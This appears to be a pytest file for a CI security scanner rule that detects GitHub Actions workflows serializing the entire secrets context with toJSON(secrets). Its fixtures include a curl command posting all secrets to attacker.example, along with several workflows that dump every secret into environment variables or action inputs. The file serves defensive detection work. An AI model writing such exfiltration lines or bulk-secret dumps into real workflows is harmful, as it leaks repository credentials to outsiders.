"""GHA-116: workflow serializes the entire secrets context."""
from __future__ import annotations

import yaml

from pipeline_check.core.checks.base import Severity
from pipeline_check.core.checks.github.rules import (
    gha116_bulk_secrets_serialization as gha116,
)

from .conftest import run_check


class TestGHA116BulkSecretsSerialization:
    def test_fires_on_tojson_secrets_in_step_env(self):
        f = run_check(
            """
            on: push
            jobs:
              build:
                runs-on: ubuntu-latest
                steps:
                  - env:
                      ALL: ${{ toJSON(secrets) }}
                    run: echo "$ALL"
            """,
            "GHA-116",
        )
        assert f.passed is False
        assert f.severity is Severity.HIGH

    def test_fires_on_tojson_secrets_in_run(self):
        f = run_check(
            """
            on: push
            jobs:
              x:
                runs-on: ubuntu-latest
                steps:
                  - run: curl -d '${{ toJSON(secrets) }}' https://attacker.example
            """,
            "GHA-116",
        )
        assert f.passed is False

    def test_fires_on_tojson_secrets_in_with(self):
        f = run_check(
            """
            on: push
            jobs:
              x:
                runs-on: ubuntu-latest
                steps:
                  - uses: some/action@<sha>
                    with:
                      payload: ${{ toJSON(secrets) }}
            """,
            "GHA-116",
        )
        assert f.passed is False

    def test_fires_on_workflow_level_env(self):
        f = run_check(
            """
            on: push
            env:
              DUMP: ${{ toJSON(secrets) }}
            jobs:
              x:
                runs-on: ubuntu-latest
                steps:
                  - run: env
            """,
            "GHA-116",
        )
        assert f.passed is False

    def test_fires_on_fromjson_wrapper(self):
        # ``fromJSON(toJSON(secrets))`` contains the same substring.
        f = run_check(
            """
            on: push
            jobs:
              x:
                runs-on: ubuntu-latest
                steps:
                  - env:
                      S: ${{ fromJSON(toJSON(secrets)) }}
                    run: echo done
            """,
            "GHA-116",
        )
        assert f.passed is False

    def test_passes_on_named_secret(self):
        f = run_check(
            """
            on: push
            jobs:
              x:
                runs-on: ubuntu-latest
                steps:
                  - env:
                      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
                    run: npm publish
            """,
            "GHA-116",
        )
        assert f.passed is True

    def test_passes_when_no_secrets(self):
        f = run_check(
            """
            on: push
            jobs:
              x:
                runs-on: ubuntu-latest
                steps:
                  - run: make build
            """,
            "GHA-116",
        )
        assert f.passed is True

    def test_exploit_example_strong_check(self):
        vuln, safe = gha116.RULE.exploit_example.split("\n\n", 1)
        assert gha116.check("wf.yml", yaml.safe_load(vuln)).passed is False
        assert gha116.check("wf.yml", yaml.safe_load(safe)).passed is True
